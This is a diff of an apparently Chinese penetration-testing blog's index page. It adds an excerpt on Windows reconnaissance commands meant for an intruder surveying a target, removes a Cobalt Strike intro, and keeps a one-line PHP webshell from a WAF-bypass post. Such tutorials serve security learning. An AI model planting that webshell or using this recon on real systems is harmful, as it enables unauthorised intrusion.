@@ -139,6 +139,41 @@
 
     <div class="post-header index">
         <h1 class="title">
+            <a href="/2017/11/05/win-cmd/">
+                基础命令使用 [ win篇 ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-11-05</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/win-cmd/">win cmd</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p>0x01 基础命令使用:</p>
+<p>演示环境:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">win2008R2cn</span>     <span class="selector-tag">ip</span>: 192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.23</span>    假设为入侵者机器</div><div class="line"><span class="selector-tag">win2012R2cn</span>     <span class="selector-tag">ip</span>: 192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.122</span>   假设为目标机器</div></pre></td></tr></table></figure></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> whoami /all			  查当前用户在目标系统中的具体权限,这可能会成为你一上来的习惯性动作 ^_^</span></div><div class="line"><span class="meta">#</span><span class="bash"> query user			  查当前机器中正在线的用户,注意管理员此时在不在</span></div><div class="line"><span class="meta">#</span><span class="bash"> hostname			  查当前机器的机器名,知道当前机器是干啥的</span></div><div class="line"><span class="meta">#</span><span class="bash"> net user 			  查当前机器中所有的用户名,开始搜集准备用户名字典</span></div><div class="line"><span class="meta">#</span><span class="bash"> net localgroup		  查当前机器中所有的组名,了解不同组的职能,如,IT,HR,ADMIN,FILE...</span></div><div class="line"><span class="meta">#</span><span class="bash"> net localgroup <span class="string">"Administrators"</span> 查指定组中的成员列表</span></div></pre></td></tr></table></figure>
+<p>查看本机ip配置:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> ipconfig /all		查看本机ip配置,观察本机是否在域内,内网段有几个,网关在哪里</span></div><div class="line"><span class="meta">#</span><span class="bash"> ipconfig /displaydns	查看本地DNS缓存</span></div></pre></td></tr></table></figure></p>
+<p>查看当前机器中所有的网络连接:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> net start				查看本机运行的所有服务</span></div><div class="line"><span class="meta">#</span><span class="bash"> netstat -ano				查看本机所有的tcp,udp端口连接及其对应的pid</span></div><div class="line"><span class="meta">#</span><span class="bash"> netstat -anob				查看本机所有的tcp,udp端口连接,pid及其对应的发起程序</span></div><div class="line"><span class="meta">#</span><span class="bash"> netstat -ano | findstr <span class="string">"ESTABLISHED"</span>	查看当前正处于连接状态的端口及ip</span></div><div class="line"><span class="meta">#</span><span class="bash"> netstat -ano | findstr <span class="string">"LISTENING"</span>	查看当前正处于监听状态的端口及ip</span></div><div class="line"><span class="meta">#</span><span class="bash"> netstat -ano | findstr <span class="string">"TIME_WAIT"</span></span></div></pre></td></tr></table></figure></p>
+        </div>
+        <a href="/2017/11/05/win-cmd/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
             <a href="/2017/11/02/termite/">
                 灵活击穿目标多级内网纵深 [ termite ]
             </a>
@@ -591,40 +626,6 @@
 <figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?php $_POST[<span class="string">'fun'</span>]($_REQUEST[<span class="string">'req'</span>]);?&gt;</div></pre></td></tr></table></figure>
         </div>
         <a href="/2017/10/11/bypasswaf-for-webshell/" class="read-more">Read More</a>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2017/09/23/cobalt-strike/">
-                cobalt strike 快速上手 [ 一 ]
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2017-09-23</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/cobalt-strike/">cobalt strike</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br><br>0x01 关于 Cobalt Strike<br><figure class="highlight prolog"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">一款非常优秀的后渗透平台 [ 谁用谁知道,嘿嘿……说不好用的唯一原因,可能就是很多用法还没有被自己挖掘出来,因为不会用,所以,才会感觉不好用 ]</div><div class="line">工具基于java,大部分功能在改进的基础上还是相对比较实用的,非常适合团队间协同作战</div><div class="line">更多详情请自行参考官网,这里就不啰嗦了,以下全部简称<span class="string">'cs'</span></div></pre></td></tr></table></figure></p>
-<p>0x02 基础环境简介:<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">kali 	  		实际控制端		<span class="built_in">ip</span>:<span class="number">192.168</span><span class="meta">.1</span><span class="meta">.144</span></div><div class="line">ubuntu <span class="number">16.04</span> 		自己公网的vps    	<span class="built_in">ip</span>:<span class="number">53.3</span><span class="meta">.3</span><span class="meta">.6</span>		</div><div class="line">win2008R2 		目标机器			<span class="built_in">ip</span>:<span class="number">192.168</span><span class="meta">.1</span><span class="meta">.191</span></div><div class="line">centos6<span class="meta">.9</span> 		已控肉鸡			<span class="built_in">ip</span>:<span class="number">192.168</span><span class="meta">.1</span><span class="meta">.199</span></div><div class="line">win7cn			另一台肉鸡		<span class="built_in">ip</span>:<span class="number">192.168</span><span class="meta">.1</span><span class="meta">.123</span></div></pre></td></tr></table></figure></p>
-<p>0x03 先来快速预览cs最基本的一些模块具体用途:</p>
-<p>团队服务器[teamserver]<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">主要是为了方便一个渗透团队内部能够及时共享所有成员的所有渗透信息,加强成员间的交流协作,以此提高渗透效率</div><div class="line">也就是说,正常情况下一个团队只需要起一个团队服务器即可,团队中的所有成员只需要拿着自己的cs客户端登录到团体服务器就能轻松实现协同作战</div><div class="line">当然,实际中可能为了尽可能久的维持住目标机器权限,还会习惯性的多开几个团队服务器,防止出现意外情况</div><div class="line">另外,团体服务器最好运行在linux平台上<span class="string">[本次演示所用的团队服务器系统为ubuntu 16.04]</span></div></pre></td></tr></table></figure></p>
-        </div>
-        <a href="/2017/09/23/cobalt-strike/" class="read-more">Read More</a>
     
 
 </div>
